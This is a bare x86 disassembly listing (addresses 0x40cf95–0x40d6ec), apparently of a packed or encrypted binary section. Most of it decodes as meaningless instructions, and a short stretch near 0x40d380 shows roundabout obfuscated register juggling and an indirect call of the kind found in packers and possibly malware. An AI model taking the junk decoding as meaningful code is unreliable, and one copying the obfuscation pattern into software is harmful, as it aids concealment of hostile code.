  40cf95:	ins    DWORD PTR es:[edi],dx
  40cf96:	or     ch,BYTE PTR [ebp-0x5b]
  40cf99:	pop    ebx
  40cf9a:	jecxz  0x40cfa0
  40cf9c:	mov    ch,0x7b
  40cf9e:	jl     0x40cffb
  40cfa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfa1:	mov    ds:0x84f42bb0,al
  40cfa6:	pusha  
  40cfa7:	xchg   BYTE PTR [eax-0x78],dl
  40cfaa:	cli    
  40cfab:	lahf   
  40cfac:	sbb    bh,cl
  40cfae:	fnsave [ebp+0x318005e7]
  40cfb4:	jmp    0xe139:0x21d60040
  40cfbb:	das    
  40cfbc:	pushf  
  40cfbd:	mov    ecx,0xc974df50
  40cfc2:	adc    DWORD PTR [ebx+0x27],edi
  40cfc5:	xor    eax,0xf60bcec
  40cfca:	in     eax,dx
  40cfcb:	xor    DWORD PTR [edx-0x59bfd9e3],ecx
  40cfd1:	jns    0x40cf81
  40cfd3:	adc    ah,BYTE PTR [eax]
  40cfd5:	out    dx,al
  40cfd6:	and    al,0xeb
  40cfd8:	ins    BYTE PTR es:[edi],dx
  40cfd9:	mov    edx,DWORD PTR [ebx+0x57]
  40cfdc:	ret    0x1798
  40cfdf:	sbb    BYTE PTR [ecx-0x5e],0xd2
  40cfe3:	inc    ebx
  40cfe4:	add    eax,0x98865275
  40cfe9:	pop    edi
  40cfea:	jmp    0x7670:0xbb3acc41
  40cff1:	xor    eax,0x40cf4b59
  40cff6:	dec    ebx
  40cff7:	dec    esp
  40cff8:	in     al,dx
  40cff9:	(bad)  
  40cffa:	popf   
  40cffb:	mov    ah,0xc3
  40cffd:	lahf   
  40cffe:	int    0xbf
  40d000:	(bad)  
  40d001:	adc    edx,DWORD PTR [edi+0x2781567a]
  40d007:	pop    esi
  40d008:	push   eax
  40d009:	ss cdq 
  40d00b:	out    dx,eax
  40d00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d00d:	xchg   ebp,eax
  40d00e:	rcr    edi,0x47
  40d011:	repz repz lahf 
  40d014:	loopne 0x40d05a
  40d016:	and    ecx,DWORD PTR [ecx+0x7e]
  40d019:	(bad)  
  40d01a:	fst    DWORD PTR [ecx+0x2d5bb3d7]
  40d020:	and    ebx,0x5c
  40d023:	mov    cl,0x99
  40d025:	repz sbb eax,0x55d0f128
  40d02b:	jecxz  0x40d08b
  40d02d:	dec    ebp
  40d02e:	out    0xd8,al
  40d030:	sar    BYTE PTR [ebp+esi*1+0x17],0xa4
  40d035:	call   0xd260:0xce3919ee
  40d03c:	je     0x40d04f
  40d03e:	loopne 0x40d0aa
  40d040:	test   esi,ecx
  40d042:	cmp    ebx,ebp
  40d044:	xchg   ebx,eax
  40d045:	jbe    0x40d07e
  40d047:	iret   
  40d048:	inc    esp
  40d049:	push   ebp
  40d04a:	in     eax,dx
  40d04b:	repnz mov ebx,0x215ea61
  40d051:	cmp    BYTE PTR [ecx-0x3a],ah
  40d054:	xor    dh,BYTE PTR [edx+eax*8-0x6d]
  40d058:	xchg   ecx,eax
  40d059:	dec    ecx
  40d05a:	pop    ebp
  40d05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d05c:	aam    0x53
  40d05e:	out    0x79,eax
  40d060:	mov    esp,fs
  40d062:	sbb    al,0x22
  40d064:	push   es
  40d065:	push   ds
  40d066:	aam    0x12
  40d068:	jl     0x40d0c5
  40d06a:	mov    ch,0xff
  40d06c:	inc    esp
  40d06d:	ins    DWORD PTR es:[edi],dx
  40d06e:	aad    0x5e
  40d070:	mul    DWORD PTR [esi+ebx*1]
  40d073:	ins    DWORD PTR es:[edi],dx
  40d074:	xchg   edi,eax
  40d075:	jb     0x40d00f
  40d077:	jae    0x40cffe
  40d079:	or     BYTE PTR [esi+0x15],dh
  40d07c:	add    DWORD PTR [ebx-0x43b71939],eax
  40d082:	adc    DWORD PTR [edx-0x29],0x69
  40d086:	es pop ds
  40d088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d089:	push   ds
  40d08a:	lock js 0x40d00f
  40d08d:	test   BYTE PTR [ecx+0x2a647026],0xb5
  40d094:	adc    BYTE PTR [edi+0x61],bl
  40d097:	push   edx
  40d098:	mov    eax,eax
  40d09a:	sbb    al,0x36
  40d09c:	outs   dx,BYTE PTR ds:[esi]
  40d09d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d09e:	test   DWORD PTR [edx],esp
  40d0a0:	enter  0x2f59,0x8f
  40d0a4:	aas    
  40d0a5:	mov    ebp,0x2acd46d6
  40d0aa:	dec    ebx
  40d0ab:	inc    edx
  40d0ac:	pushf  
  40d0ad:	mov    esp,0xa77d5775
  40d0b2:	jmp    0x40d111
  40d0b4:	adc    ecx,esp
  40d0b6:	mov    dl,0xa7
  40d0b8:	jo     0x40d0df
  40d0ba:	and    BYTE PTR [eax],cl
  40d0bc:	and    al,0xa8
  40d0be:	ins    BYTE PTR es:[edi],dx
  40d0bf:	cmp    DWORD PTR fs:[ecx+0x1740ccfb],edi
  40d0c6:	repz mov esp,0xe2291a2d
  40d0cc:	inc    esi
  40d0cd:	adc    al,0xc4
  40d0cf:	adc    al,0x91
  40d0d1:	out    0x1b,al
  40d0d3:	sub    eax,0x63fb4be1
  40d0d8:	fwait
  40d0d9:	cli    
  40d0da:	xor    BYTE PTR [esi],dl
  40d0dc:	sub    esi,esp
  40d0de:	int    0x48
  40d0e0:	jae    0x40d083
  40d0e2:	into   
  40d0e3:	test   BYTE PTR [edi],ah
  40d0e5:	add    al,0x97
  40d0e7:	sbb    BYTE PTR [edi+0x52],0x48
  40d0eb:	mov    gs,WORD PTR [edi+edi*1-0x8a0c2a]
  40d0f2:	jmp    0x40d0cc
  40d0f4:	pop    esp
  40d0f5:	xchg   esp,eax
  40d0f6:	fwait
  40d0f7:	jmp    0x7ed817ed
  40d0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0fd:	test   DWORD PTR [edi+ebp*2+0x7d],ecx
  40d101:	(bad)  
  40d102:	lahf   
  40d103:	iret   
  40d104:	jmp    0x40d157
  40d106:	or     eax,0xa40bb72f
  40d10b:	lock test ebx,ebx
  40d10e:	int3   
  40d10f:	icebp  
  40d110:	mov    edx,0x289e9ac6
  40d115:	call   0x4528ff81
  40d11a:	rcr    DWORD PTR [edi+0x3d93bd08],1
  40d120:	jae    0x40d0bb
  40d122:	xor    eax,0xe1fe8322
  40d127:	ss neg bh
  40d12a:	pop    esi
  40d12b:	repnz sub DWORD PTR [ecx+0x1f742fc5],0x5a14b100
  40d136:	loopne 0x40d0c2
  40d138:	or     al,0x1
  40d13a:	or     eax,0xddf0e599
  40d13f:	lds    ecx,FWORD PTR [edx+0x349d45d0]
  40d145:	ror    ecx,0x3a
  40d148:	dec    ecx
  40d149:	xor    ch,BYTE PTR [eax-0x671b1c0e]
  40d14f:	test   DWORD PTR [eax],ebp
  40d151:	loope  0x40d116
  40d153:	push   edx
  40d154:	pushf  
  40d155:	stos   DWORD PTR es:[edi],eax
  40d156:	and    DWORD PTR [ebx-0x63],eax
  40d159:	jbe    0x40d18d
  40d15b:	adc    al,0xf2
  40d15d:	sbb    DWORD PTR [edi-0x10e058cd],0xffffffb7
  40d164:	mov    ecx,0xd1d4b9d0
  40d169:	xor    eax,edx
  40d16b:	jnp    0x40d14c
  40d16d:	aad    0x57
  40d16f:	mov    esi,0x3379674b
  40d174:	cdq    
  40d175:	sub    dl,BYTE PTR [esi-0x25470a3a]
  40d17b:	dec    esp
  40d17c:	sub    al,0xa8
  40d17e:	jecxz  0x40d1d6
  40d180:	ror    bl,0x79
  40d183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d184:	lahf   
  40d185:	inc    edx
  40d186:	cli    
  40d187:	sbb    eax,0x30e51200
  40d18c:	and    al,0x91
  40d18e:	push   0xfffffff2
  40d190:	pop    ecx
  40d191:	sub    al,BYTE PTR [esi+0x3141c3f2]
  40d197:	sbb    ah,BYTE PTR [edx+eiz*8+0x29]
  40d19b:	xchg   ah,dl
  40d19d:	stos   BYTE PTR es:[edi],al
  40d19e:	cmp    al,0x5
  40d1a0:	push   ds
  40d1a1:	loopne 0x40d194
  40d1a3:	imul   ecx,ecx,0x5d
  40d1a6:	ffreep st(5)
  40d1a8:	sub    BYTE PTR ds:0x5f6b,al
  40d1ad:	add    al,0xa6
  40d1af:	push   ds
  40d1b0:	cmp    eax,0x9299880c
  40d1b5:	in     al,0xae
  40d1b7:	inc    ebx
  40d1b8:	call   DWORD PTR [ebx+0x75]
  40d1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1bc:	jmp    0x19c93f12
  40d1c1:	lods   eax,DWORD PTR ds:[esi]
  40d1c2:	and    esp,DWORD PTR ds:0xf122cac6
  40d1c8:	dec    esi
  40d1c9:	xlat   BYTE PTR ds:[ebx]
  40d1ca:	cmp    edx,DWORD PTR [ecx+0x69]
  40d1cd:	lods   eax,DWORD PTR ds:[esi]
  40d1ce:	cmp    al,0x3e
  40d1d0:	scas   al,BYTE PTR es:[edi]
  40d1d1:	or     dh,BYTE PTR [eax-0x39]
  40d1d4:	(bad)  
  40d1d5:	push   ss
  40d1d6:	outs   dx,BYTE PTR ds:[esi]
  40d1d7:	xor    al,0x3d
  40d1d9:	test   DWORD PTR [ebp+0x4486798],ebp
  40d1df:	push   es
  40d1e0:	or     edi,DWORD PTR [ecx-0x6213bf47]
  40d1e6:	stos   BYTE PTR es:[edi],al
  40d1e7:	ss in  al,0xbc
  40d1ea:	lock xor BYTE PTR [ebx+esi*4+0x7f],0x63
  40d1f0:	and    eax,0xebce08c4
  40d1f5:	retf   0x7d73
  40d1f8:	inc    ebx
  40d1f9:	fisub  WORD PTR [esi-0x2dddd1ae]
  40d1ff:	fcomp  st(1)
  40d201:	call   0x11fa:0x23eeb0f0
  40d208:	adc    al,0x70
  40d20a:	retf   0x561f
  40d20d:	sbb    bh,dh
  40d20f:	aad    0x75
  40d211:	mov    edx,0xc0a43d13
  40d216:	cmc    
  40d217:	pop    ds
  40d218:	push   edx
  40d219:	jmp    0xc040ed07
  40d21e:	jnp    0x40d27d
  40d220:	jne    0x40d1ad
  40d222:	out    0xac,eax
  40d224:	leave  
  40d225:	mov    dl,0x6e
  40d227:	xchg   edi,eax
  40d228:	dec    ebx
  40d229:	sbb    ecx,DWORD PTR [ecx]
  40d22b:	and    eax,0x527153b8
  40d230:	call   0xeddb6334
  40d235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d236:	das    
  40d237:	retf   
  40d238:	inc    edi
  40d239:	mov    ch,BYTE PTR [ebx]
  40d23b:	mov    dl,0x4c
  40d23d:	jmp    0x40d25c
  40d23f:	jge    0x40d280
  40d241:	xlat   BYTE PTR ds:[ebx]
  40d242:	or     eax,0x771365
  40d247:	add    si,dx
  40d24a:	outs   dx,DWORD PTR cs:[esi]
  40d24c:	bound  esi,QWORD PTR [edi]
  40d24e:	xchg   esi,eax
  40d24f:	pushf  
  40d250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d251:	loopne 0x40d20c
  40d253:	cmp    al,BYTE PTR [edx+0xc3f12e6]
  40d259:	cmp    DWORD PTR [edi],edx
  40d25b:	inc    esp
  40d25c:	mov    WORD PTR [edx+0x530783f8],ds
  40d262:	mov    al,ds:0xadc082d2
  40d267:	fild   QWORD PTR [edx+esi*4-0x80]
  40d26b:	mov    ebp,0xa69c3d5a
  40d270:	xchg   ebx,eax
  40d271:	iret   
  40d272:	xchg   ebp,eax
  40d273:	inc    ebx
  40d274:	pop    edx
  40d275:	dec    esi
  40d276:	jae    0x40d2e7
  40d278:	mov    ds:0x556a9f9,eax
  40d27d:	je     0x40d2e3
  40d27f:	fdivp  st(6),st
  40d281:	jp     0x40d289
  40d283:	mov    esp,0x2ed116f4
  40d288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d289:	stc    
  40d28a:	jae    0x40d218
  40d28c:	enter  0xa748,0x30
  40d290:	cdq    
  40d291:	jmp    0x40d29e
  40d293:	and    BYTE PTR [ecx+eiz*8],cl
  40d296:	or     BYTE PTR [ebp-0x3387b7d8],al
  40d29c:	inc    ecx
  40d29d:	ins    DWORD PTR es:[edi],dx
  40d29e:	add    al,0x49
  40d2a0:	push   ss
  40d2a1:	xor    ah,BYTE PTR [ebp+edx*1+0x31]
  40d2a5:	aam    0x79
  40d2a7:	pop    eax
  40d2a8:	dec    ecx
  40d2a9:	and    dh,BYTE PTR [ebx-0x20]
  40d2ac:	hlt    
  40d2ad:	or     ah,ah
  40d2af:	repz sub cl,al
  40d2b2:	call   0xa99f:0xfe3f9378
  40d2b9:	push   edx
  40d2ba:	pop    edx
  40d2bb:	icebp  
  40d2bc:	test   eax,0x48b9a1fc
  40d2c1:	ficomp WORD PTR [ebx+0x49]
  40d2c4:	mov    esp,0x3e301b4
  40d2c9:	(bad)  
  40d2cb:	lock add eax,DWORD PTR ds:0x4518c24b
  40d2d2:	cld    
  40d2d3:	mov    ds:0x8b3ee99b,al
  40d2d8:	jp     0x40d28a
  40d2da:	adc    bl,BYTE PTR [ebx+0xb0f73a]
  40d2e0:	rol    BYTE PTR [edi+0x1c],cl
  40d2e3:	jo     0x40d34b
  40d2e5:	push   esi
  40d2e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e7:	retf   
  40d2e8:	and    ah,bl
  40d2ea:	pop    esi
  40d2eb:	fs repz mov edx,fs
  40d2ef:	inc    ebx
  40d2f0:	inc    ebx
  40d2f1:	or     DWORD PTR [esi-0x1a80233a],esi
  40d2f7:	xor    BYTE PTR [ebp+ebx*2+0x56ef70f6],bl
  40d2fe:	call   0x7cc2:0xdd55e648
  40d305:	inc    esp
  40d306:	fcomp  st(7)
  40d308:	xchg   ebp,eax
  40d309:	sbb    al,0xd7
  40d30b:	cld    
  40d30c:	ret    0x485
  40d30f:	test   BYTE PTR [ecx-0x3f],0x3d
  40d313:	and    BYTE PTR [edi],0xfd
  40d316:	pusha  
  40d317:	mov    esi,0x982afab9
  40d31c:	and    al,0x44
  40d31e:	pop    ebp
  40d31f:	cmp    BYTE PTR [ebx],cl
  40d321:	mov    bl,0x95
  40d323:	loope  0x40d2ef
  40d325:	pushf  
  40d326:	xor    al,0x84
  40d328:	(bad)  
  40d329:	rcl    DWORD PTR [ebx-0x359b50c],1
  40d32f:	into   
  40d330:	fwait
  40d331:	jae    0x40d2c3
  40d333:	cmp    ebp,DWORD PTR [ecx]
  40d335:	pop    ds
  40d336:	out    dx,eax
  40d337:	pop    ecx
  40d338:	adc    esp,esi
  40d33a:	stos   BYTE PTR es:[edi],al
  40d33b:	js     0x40d2c2
  40d33d:	lods   eax,DWORD PTR ds:[esi]
  40d33e:	les    esi,FWORD PTR [ebp+eiz*4-0x2e8a724a]
  40d345:	repz test BYTE PTR cs:[eax-0x22db299],dh
  40d34d:	jecxz  0x40d2d4
  40d34f:	das    
  40d350:	adc    DWORD PTR [ebp-0x6af4b35d],0x15
  40d357:	dec    ebx
  40d358:	lods   eax,DWORD PTR ds:[esi]
  40d359:	repz and BYTE PTR [ebx],0x93
  40d35d:	icebp  
  40d35e:	pop    ecx
  40d35f:	ss scas eax,DWORD PTR es:[edi]
  40d361:	mov    dh,0x7e
  40d363:	push   es
  40d364:	mov    ecx,0xc2560afc
  40d369:	or     al,0xbf
  40d36b:	mov    al,0x19
  40d36d:	aaa    
  40d36e:	scas   al,BYTE PTR es:[edi]
  40d36f:	(bad)  
  40d370:	aam    0x80
  40d372:	mov    ds:0xc01eb751,eax
  40d377:	pushf  
  40d378:	sub    BYTE PTR [ebx+0x272ecef5],0x81
  40d37f:	ret    
  40d380:	add    dl,BYTE PTR [eax]
  40d382:	add    BYTE PTR [eax],al
  40d384:	lea    eax,[ebp-0x18]
  40d387:	add    edx,eax
  40d389:	add    edx,0x5
  40d38c:	push   edx
  40d38d:	inc    esi
  40d38e:	pop    ecx
  40d38f:	dec    ecx
  40d390:	xchg   ecx,eax
  40d391:	dec    eax
  40d392:	xchg   ecx,eax
  40d393:	dec    ecx
  40d394:	xchg   ecx,edx
  40d396:	dec    edx
  40d397:	push   edx
  40d398:	mov    edx,ebx
  40d39a:	pop    ebx
  40d39b:	dec    ebx
  40d39c:	call   DWORD PTR [ebx]
  40d39e:	cmp    DWORD PTR [ebp+0x10],esi
  40d3a1:	je     0x40f754
  40d3a7:	xchg   edx,eax
  40d3a8:	push   0xc
  40d3aa:	pop    ecx
  40d3ab:	dec    ecx
  40d3ac:	push   0x3
  40d3ae:	pop    ebx
  40d3af:	inc    ebx
  40d3b0:	xchg   ebx,ecx
  40d3b2:	inc    ecx
  40d3b3:	sub    ebx,ecx
  40d3b5:	xchg   ebx,ecx
  40d3b7:	dec    ecx
  40d3b8:	dec    ecx
  40d3b9:	mov    eax,DWORD PTR [ebp-0x1c]
  40d3bc:	imul   eax,ecx
  40d3bf:	jmp    0x40f751
  40d3c4:	inc    eax
  40d3c5:	sbb    edx,DWORD PTR [ebp-0x1e]
  40d3c8:	push   edx
  40d3c9:	mov    ds:0x35198590,al
  40d3ce:	aad    0x91
  40d3d0:	or     eax,0xb2c6aea4
  40d3d5:	rol    DWORD PTR [ebx-0x7ca1f37d],cl
  40d3db:	and    DWORD PTR [edi],0x7e
  40d3de:	xchg   esp,eax
  40d3df:	std    
  40d3e0:	into   
  40d3e1:	push   ds
  40d3e2:	push   eax
  40d3e3:	pop    eax
  40d3e4:	mov    al,bh
  40d3e6:	or     BYTE PTR [ecx-0x7f961e8a],bh
  40d3ec:	mov    esp,0xd9786e88
  40d3f1:	retf   0xb7ed
  40d3f4:	ins    BYTE PTR es:[edi],dx
  40d3f5:	jnp    0x40d3f4
  40d3f7:	shl    BYTE PTR [ebx-0x50],0x5f
  40d3fb:	push   ebx
  40d3fc:	mov    edx,0x9a2da224
  40d401:	inc    eax
  40d402:	jmp    0x40d3dd
  40d404:	ins    BYTE PTR es:[edi],dx
  40d405:	outs   dx,BYTE PTR ds:[esi]
  40d406:	pop    esp
  40d407:	sub    DWORD PTR [ebx-0x3dc96205],eax
  40d40d:	cdq    
  40d40e:	push   0xa241b86d
  40d413:	jns    0x40d48d
  40d415:	sbb    al,0xc3
  40d417:	xor    BYTE PTR [edi],bh
  40d419:	mov    ebp,0x666c1c5e
  40d41e:	inc    ebp
  40d41f:	test   DWORD PTR [ebp-0x3fe8f5c4],esp
  40d425:	frstor [edx-0x5e]
  40d428:	mov    eax,ds:0xe199c575
  40d42d:	pop    ss
  40d42e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d42f:	inc    ebx
  40d430:	out    0xf0,eax
  40d432:	adc    BYTE PTR [edx+0x28],dh
  40d435:	aam    0x6b
  40d437:	(bad)  
  40d438:	push   edi
  40d439:	mov    WORD PTR [eax+esi*1],gs
  40d43c:	xor    DWORD PTR [esi-0x63407cb6],ebx
  40d442:	pop    ecx
  40d443:	fdiv   DWORD PTR [ecx+0x37]
  40d446:	test   eax,0x5112ef57
  40d44b:	sbb    eax,0x3c99a428
  40d450:	and    esi,ebp
  40d452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d453:	call   0x7b95:0x11cff58
  40d45a:	jo     0x40d4d4
  40d45c:	jmp    0x40d431
  40d45e:	dec    esi
  40d45f:	pop    ebx
  40d460:	mov    ch,0xd
  40d462:	push   es
  40d463:	adc    ebp,DWORD PTR [eax-0x31]
  40d466:	fiadd  DWORD PTR [edi+0x48]
  40d469:	dec    edi
  40d46a:	jne    0x40d443
  40d46c:	jecxz  0x40d3fc
  40d46e:	pop    esi
  40d46f:	ret    0xeae7
  40d472:	xchg   ebp,eax
  40d473:	imul   edi,ebx,0x7e
  40d476:	mov    ds:0x32eed62e,eax
  40d47b:	stos   DWORD PTR es:[edi],eax
  40d47c:	shr    BYTE PTR [edi+0x437f4ef],cl
  40d482:	mov    ebp,0x621025b1
  40d487:	sbb    al,0xd4
  40d489:	out    0xaf,eax
  40d48b:	sbb    edx,DWORD PTR [ecx]
  40d48d:	fcomp  DWORD PTR [esi-0x4b]
  40d490:	(bad)  
  40d492:	cmp    dh,BYTE PTR [edx]
  40d494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d495:	mov    ebp,0xf0924b39
  40d49a:	xchg   BYTE PTR [ebp+ebp*1+0x69d35816],ch
  40d4a1:	cmp    al,0x5d
  40d4a3:	outs   dx,DWORD PTR ds:[esi]
  40d4a4:	cmp    al,0x22
  40d4a6:	mov    ecx,0x766ba97f
  40d4ab:	ret    
  40d4ac:	daa    
  40d4ad:	enter  0x458b,0xb7
  40d4b1:	fsub   QWORD PTR [eax]
  40d4b3:	and    DWORD PTR [ebx+eax*4-0x28],esi
  40d4b7:	in     eax,0xe1
  40d4b9:	daa    
  40d4ba:	sbb    al,BYTE PTR [ebx+edx*8-0x28]
  40d4be:	jb     0x40d4a9
  40d4c0:	jns    0x40d497
  40d4c2:	int3   
  40d4c3:	sub    bh,BYTE PTR [edx]
  40d4c5:	xor    dh,BYTE PTR [ecx+0x10724b38]
  40d4cb:	add    eax,0x1be5e257
  40d4d0:	rol    DWORD PTR ds:0x2eb5d5c8,1
  40d4d6:	cld    
  40d4d7:	ret    0xa4b2
  40d4da:	test   DWORD PTR [ebx-0x6361a19],0x1734ff1
  40d4e4:	cmp    al,0x75
  40d4e6:	pop    es
  40d4e7:	mov    DWORD PTR [bp+0x3e9e],edx
  40d4ec:	js     0x40d527
  40d4ee:	ins    DWORD PTR es:[edi],dx
  40d4ef:	xor    BYTE PTR [ebx-0x71],bh
  40d4f2:	push   ecx
  40d4f3:	retf   
  40d4f4:	aas    
  40d4f5:	shl    DWORD PTR [ecx+0xb],cl
  40d4f8:	clc    
  40d4f9:	or     eax,DWORD PTR [edx-0x56]
  40d4fc:	push   ss
  40d4fd:	shl    DWORD PTR [ebx+0x7927cdd0],0x3
  40d504:	icebp  
  40d505:	jnp    0x40d4ee
  40d507:	sar    ch,1
  40d509:	push   edx
  40d50a:	leave  
  40d50b:	xchg   esp,eax
  40d50c:	in     eax,0x1d
  40d50e:	cmp    bh,al
  40d510:	adc    DWORD PTR [esi+0x39],ebx
  40d513:	dec    ebx
  40d514:	sbb    ebp,eax
  40d516:	in     eax,0xf0
  40d518:	fs jg  0x40d534
  40d51b:	pop    ax
  40d51d:	xchg   edx,eax
  40d51e:	mov    eax,ds:0x4fb93bc9
  40d523:	dec    esi
  40d524:	loope  0x40d4da
  40d526:	pop    es
  40d527:	neg    ecx
  40d529:	repnz push ebx
  40d52b:	jns    0x40d580
  40d52d:	call   0x9e24:0x9a392672
  40d534:	fadd   st,st(0)
  40d536:	pop    ss
  40d537:	jmp    0x40d578
  40d539:	or     eax,0x1947123f
  40d53e:	lods   al,BYTE PTR ds:[esi]
  40d53f:	ins    BYTE PTR es:[edi],dx
  40d540:	nop
  40d541:	push   DWORD PTR ds:0xc86c345e
  40d547:	test   al,0xe4
  40d549:	not    BYTE PTR [edi+0x34]
  40d54c:	inc    eax
  40d54d:	cwde   
  40d54e:	mov    cl,BYTE PTR [ebp+0x19]
  40d551:	dec    esp
  40d552:	mov    ds:0xb9725bd7,eax
  40d557:	sbb    ebx,esp
  40d559:	rcr    BYTE PTR [esi+eax*1+0x23],cl
  40d55d:	cwde   
  40d55e:	aas    
  40d55f:	mov    edi,0x51327a93
  40d564:	push   es
  40d565:	xchg   esp,eax
  40d566:	sar    ebp,cl
  40d568:	cmc    
  40d569:	int3   
  40d56a:	mov    bl,0x59
  40d56c:	jns    0x40d598
  40d56e:	call   0xe70ba5d7
  40d573:	pop    eax
  40d574:	pushf  
  40d575:	jg     0x40d595
  40d577:	out    0x4e,eax
  40d579:	dec    esp
  40d57a:	call   0x24a317ab
  40d57f:	ss inc ebx
  40d581:	loopne 0x40d56c
  40d583:	add    al,0x34
  40d585:	pop    ebp
  40d586:	fld    QWORD PTR [esi+eax*4]
  40d589:	sbb    DWORD PTR [edx],ebp
  40d58b:	mov    ebx,0x7d781009
  40d590:	sbb    al,BYTE PTR [ebx+0x4c]
  40d593:	mov    BYTE PTR [esi+edx*8-0x4c],bh
  40d597:	xor    dh,BYTE PTR [ebx+0x1b6c350c]
  40d59d:	adc    eax,0x8a91106a
  40d5a2:	inc    edx
  40d5a3:	jno    0x40d5c3
  40d5a5:	push   0xffffffa4
  40d5a7:	repz cmp al,0xc0
  40d5aa:	test   eax,0xc6f3211e
  40d5af:	inc    esp
  40d5b0:	ror    DWORD PTR [edi],0xf6
  40d5b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5b4:	test   al,0xc2
  40d5b6:	idiv   esi
  40d5b8:	test   DWORD PTR [edx+0x78],ebx
  40d5bb:	jecxz  0x40d615
  40d5bd:	pop    edi
  40d5be:	fwait
  40d5bf:	sbb    ch,BYTE PTR [eax+ebx*2-0x5]
  40d5c3:	loope  0x40d5bd
  40d5c5:	jne    0x40d5e5
  40d5c7:	adc    cl,dl
  40d5c9:	stos   BYTE PTR es:[edi],al
  40d5ca:	into   
  40d5cb:	add    ebx,DWORD PTR [ebp-0x4f]
  40d5ce:	jmp    0xd7038947
  40d5d3:	cld    
  40d5d4:	or     bp,WORD PTR [esi]
  40d5d7:	stos   DWORD PTR es:[edi],eax
  40d5d8:	pop    ecx
  40d5d9:	cmc    
  40d5da:	or     eax,0x8853f9ef
  40d5df:	mov    ch,0x6f
  40d5e1:	fstp   DWORD PTR [ebx-0x67]
  40d5e4:	out    dx,eax
  40d5e5:	(bad)  
  40d5e6:	ds jg  0x40d5da
  40d5e9:	jb     0x40d630
  40d5eb:	imul   edi,DWORD PTR [edx],0x47c553dd
  40d5f1:	lods   al,BYTE PTR ds:[esi]
  40d5f2:	and    al,dh
  40d5f4:	into   
  40d5f5:	je     0x40d5d8
  40d5f7:	mov    edx,0x9a812965
  40d5fc:	cmp    eax,esi
  40d5fe:	jmp    0x6969:0x78691a2b
  40d605:	cmp    al,0x84
  40d607:	jno    0x40d58c
  40d609:	mov    al,ds:0xc6e0309b
  40d60e:	xor    al,0xd8
  40d610:	add    bh,BYTE PTR [ebp+eiz*4-0x508dc3e6]
  40d617:	mov    ch,0xc6
  40d619:	int    0x70
  40d61b:	push   eax
  40d61c:	das    
  40d61d:	and    BYTE PTR [ecx-0x18d2be77],al
  40d623:	ja     0x40d674
  40d625:	ds lahf 
  40d627:	imul   ebp,DWORD PTR [ecx],0xffffffb8
  40d62a:	sbb    ch,al
  40d62c:	retf   
  40d62d:	mov    ah,0xf4
  40d62f:	inc    ebp
  40d630:	sbb    BYTE PTR [ecx+0x404f9205],ah
  40d636:	adc    al,0xed
  40d638:	push   0x47
  40d63a:	push   ebp
  40d63b:	xor    DWORD PTR [eax],0xfeffad90
  40d641:	jmp    0xefc24fde
  40d646:	mov    ds:0x5c099b69,al
  40d64b:	mov    esi,0x8d36db3a
  40d650:	pop    ebx
  40d651:	nop
  40d652:	mov    ch,BYTE PTR [ecx-0x5]
  40d655:	dec    edx
  40d656:	and    ah,dh
  40d658:	nop
  40d659:	mov    cl,0x72
  40d65b:	scas   eax,DWORD PTR es:[edi]
  40d65c:	and    DWORD PTR [esi+edi*8],esi
  40d65f:	pop    ds
  40d660:	or     esi,DWORD PTR [ebp+0x523a78a1]
  40d666:	xchg   edx,eax
  40d667:	outs   dx,BYTE PTR ds:[esi]
  40d668:	repnz push ebp
  40d66a:	push   es
  40d66b:	or     ah,BYTE PTR [edx-0x245dc177]
  40d671:	add    DWORD PTR [esi],eax
  40d673:	sbb    DWORD PTR [edx],0xffffffd1
  40d676:	pop    esi
  40d677:	adc    eax,0x957970c4
  40d67c:	(bad)  
  40d67d:	xor    al,0xe8
  40d67f:	inc    edx
  40d680:	xchg   edx,eax
  40d681:	inc    ebx
  40d682:	mov    eax,ebx
  40d684:	push   esp
  40d685:	aas    
  40d686:	stos   BYTE PTR es:[edi],al
  40d687:	pop    esi
  40d688:	gs nop
  40d68a:	into   
  40d68b:	pop    edx
  40d68c:	ror    esp,1
  40d68e:	nop
  40d68f:	fcom   QWORD PTR [ecx-0x60]
  40d692:	jle    0x40d67e
  40d694:	lods   eax,DWORD PTR ds:[esi]
  40d695:	push   es
  40d696:	pop    ebx
  40d697:	pop    ss
  40d698:	call   0x6613:0x3702b4a3
  40d69f:	sub    BYTE PTR [ecx+0x4390404e],dl
  40d6a5:	jp     0x40d706
  40d6a7:	jmp    0xe438a56b
  40d6ac:	dec    esp
  40d6ad:	or     DWORD PTR [ebx],eax
  40d6af:	jo     0x40d6b0
  40d6b1:	add    al,BYTE PTR [ebx-0x737e7c98]
  40d6b7:	paddb  mm3,QWORD PTR [ebp+edi*1+0x21]
  40d6bc:	sub    BYTE PTR [edx+0x1330e11f],ch
  40d6c2:	into   
  40d6c3:	pop    esi
  40d6c4:	jns    0x40d6ac
  40d6c6:	pop    ds
  40d6c7:	rcl    BYTE PTR [ebx],1
  40d6c9:	pop    eax
  40d6ca:	imul   eax,ecx,0xd8d1feaf
  40d6d0:	jo     0x40d6d5
  40d6d2:	retf   
  40d6d3:	aad    0x2b
  40d6d5:	dec    eax
  40d6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d7:	xor    eax,0x7c18db1e
  40d6dc:	push   esi
  40d6dd:	test   ebp,edi
  40d6df:	retf   0x7690
  40d6e2:	xchg   ecx,eax
  40d6e3:	stos   DWORD PTR es:[edi],eax
  40d6e4:	or     edi,eax
  40d6e6:	rcl    BYTE PTR [eax+0x614e0216],cl
  40d6ec:	cmp    ecx,DWORD PTR [esi]
